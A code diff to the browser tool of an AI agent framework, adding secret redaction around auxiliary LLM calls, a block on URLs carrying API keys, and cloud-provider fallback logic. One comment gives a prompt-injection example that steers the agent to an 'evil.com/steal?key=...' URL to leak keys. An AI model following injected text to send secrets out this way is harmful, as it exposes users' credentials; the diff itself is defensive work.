@@ -65,6 +65,7 @@ import requests
 from typing import Dict, Any, Optional, List
 from pathlib import Path
 from agent.auxiliary_client import call_llm
+from hermes_constants import get_hermes_home
 
 try:
     from tools.website_policy import check_website_access
@@ -78,6 +79,7 @@ except Exception:
 from tools.browser_providers.base import CloudBrowserProvider
 from tools.browser_providers.browserbase import BrowserbaseProvider
 from tools.browser_providers.browser_use import BrowserUseProvider
+from tools.tool_backend_helpers import normalize_browser_cloud_provider
 
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
@@ -143,7 +145,7 @@ def _get_command_timeout() -> int:
     ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.
     """
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         if config_path.exists():
             import yaml
@@ -245,7 +247,9 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     """Return the configured cloud browser provider, or None for local mode.
 
     Reads ``config["browser"]["cloud_provider"]`` once and caches the result
-    for the process lifetime.  If unset → local mode (None).
+    for the process lifetime. An explicit ``local`` provider disables cloud
+    fallback. If unset, fall back to Browserbase when direct or managed
+    Browserbase credentials are available.
     """
     global _cached_cloud_provider, _cloud_provider_resolved
     if _cloud_provider_resolved:
@@ -253,18 +257,62 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
 
     _cloud_provider_resolved = True
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         if config_path.exists():
             import yaml
             with open(config_path) as f:
                 cfg = yaml.safe_load(f) or {}
-            provider_key = cfg.get("browser", {}).get("cloud_provider")
+            browser_cfg = cfg.get("browser", {})
+            provider_key = None
+            if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
+                provider_key = normalize_browser_cloud_provider(
+                    browser_cfg.get("cloud_provider")
+                )
+                if provider_key == "local":
+                    _cached_cloud_provider = None
+                    return None
             if provider_key and provider_key in _PROVIDER_REGISTRY:
                 _cached_cloud_provider = _PROVIDER_REGISTRY[provider_key]()
     except Exception as e:
         logger.debug("Could not read cloud_provider from config: %s", e)
+
+    if _cached_cloud_provider is None:
+        fallback_provider = BrowserbaseProvider()
+        if fallback_provider.is_configured():
+            _cached_cloud_provider = fallback_provider
+
     return _cached_cloud_provider
+
+
+def _get_browserbase_config_or_none() -> Optional[Dict[str, Any]]:
+    """Return Browserbase direct or managed config, or None when unavailable."""
+    return BrowserbaseProvider()._get_config_or_none()
+
+
+def _get_browserbase_config() -> Dict[str, Any]:
+    """Return Browserbase config or raise when neither direct nor managed mode is available."""
+    return BrowserbaseProvider()._get_config()
+
+
+def _is_local_mode() -> bool:
+    """Return True when the browser tool will use a local browser backend."""
+    if _get_cdp_override():
+        return False
+    return _get_cloud_provider() is None
+
+
+def _is_local_backend() -> bool:
+    """Return True when the browser runs locally (no cloud provider).
+
+    SSRF protection is only meaningful for cloud backends (Browserbase,
+    BrowserUse) where the agent could reach internal resources on a remote
+    machine.  For local backends — Camofox, or the built-in headless
+    Chromium without a cloud provider — the user already has full terminal
+    and network access on the same machine, so the check adds no security
+    value.
+    """
+    return _is_camofox_mode() or _get_cloud_provider() is None
 
 
 def _allow_private_urls() -> bool:
@@ -280,7 +328,7 @@ def _allow_private_urls() -> bool:
     _allow_private_urls_resolved = True
     _cached_allow_private_urls = False  # safe default
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         if config_path.exists():
             import yaml
@@ -730,7 +778,7 @@ def _find_agent_browser() -> str:
             extra_dirs.append(d)
     extra_dirs.extend(_discover_homebrew_node_dirs())
 
-    hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+    hermes_home = get_hermes_home()
     hermes_node_bin = str(hermes_home / "node" / "bin")
     if os.path.isdir(hermes_node_bin):
         extra_dirs.append(hermes_node_bin)
@@ -857,7 +905,7 @@ def _run_browser_command(
 
         # Ensure PATH includes Hermes-managed Node first, Homebrew versioned
         # node dirs (for macOS ``brew install node@24``), then standard system dirs.
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         hermes_node_bin = str(hermes_home / "node" / "bin")
 
         existing_path = browser_env.get("PATH", "")
@@ -1017,6 +1065,13 @@ def _extract_relevant_content(
             f"Provide a concise summary focused on interactive elements and key content."
         )
 
+    # Redact secrets from snapshot before sending to auxiliary LLM.
+    # Without this, a page displaying env vars or API keys would leak
+    # secrets to the extraction model before run_agent.py's general
+    # redaction layer ever sees the tool result.
+    from agent.redact import redact_sensitive_text
+    extraction_prompt = redact_sensitive_text(extraction_prompt)
+
     try:
         call_kwargs = {
             "task": "web_extract",
@@ -1028,7 +1083,9 @@ def _extract_relevant_content(
         if model:
             call_kwargs["model"] = model
         response = call_llm(**call_kwargs)
-        return (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        # Redact any secrets the auxiliary LLM may have echoed back.
+        return redact_sensitive_text(extracted)
     except Exception:
         return _truncate_snapshot(snapshot_text)
 
@@ -1065,10 +1122,23 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    # Secret exfiltration protection — block URLs that embed API keys or
+    # tokens in query parameters. A prompt injection could trick the agent
+    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    from agent.redact import _PREFIX_RE
+    if _PREFIX_RE.search(url):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL contains what appears to be an API key or token. "
+                     "Secrets must not be sent in URLs.",
+        })
+
     # SSRF protection — block private/internal addresses before navigating.
-    # Can be opted out via ``browser.allow_private_urls`` in config for local
-    # development or LAN access use cases.
-    if not _allow_private_urls() and not _is_safe_url(url):
+    # Skipped for local backends (Camofox, headless Chromium without a cloud
+    # provider) because the agent already has full local network access via
+    # the terminal tool.  Can also be opted out for cloud mode via
+    # ``browser.allow_private_urls`` in config.
+    if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL targets a private or internal address",
@@ -1110,7 +1180,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         # Post-redirect SSRF check — if the browser followed a redirect to a
         # private/internal address, block the result so the model can't read
         # internal content via subsequent browser_snapshot calls.
-        if not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
+        # Skipped for local backends (same rationale as the pre-nav check).
+        if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
             # Navigate away to a blank page to prevent snapshot leaks
             _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
             return json.dumps({
@@ -1471,7 +1542,7 @@ def _maybe_start_recording(task_id: str):
     if task_id in _recording_sessions:
         return
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         record_enabled = False
         if config_path.exists():
@@ -1706,6 +1777,9 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         response = call_llm(**call_kwargs)
         
         analysis = (response.choices[0].message.content or "").strip()
+        # Redact secrets the vision LLM may have read from the screenshot.
+        from agent.redact import redact_sensitive_text
+        analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
             "analysis": analysis or "Vision analysis returned no content.",
@@ -1757,7 +1831,7 @@ def _cleanup_old_recordings(max_age_hours=72):
     """Remove browser recordings older than max_age_hours to prevent disk bloat."""
     import time
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         recordings_dir = hermes_home / "browser_recordings"
         if not recordings_dir.exists():
             return
@@ -1931,7 +2005,7 @@ if __name__ == "__main__":
             print("     Install: npm install -g agent-browser && agent-browser install --with-deps")
         if _cp is not None and not _cp.is_configured():
             print(f"   - {_cp.provider_name()} credentials not configured")
-            print("   Tip: remove cloud_provider from config to use free local mode instead")
+            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")
     
     print("\n📋 Available Browser Tools:")
     for schema in BROWSER_TOOL_SCHEMAS:
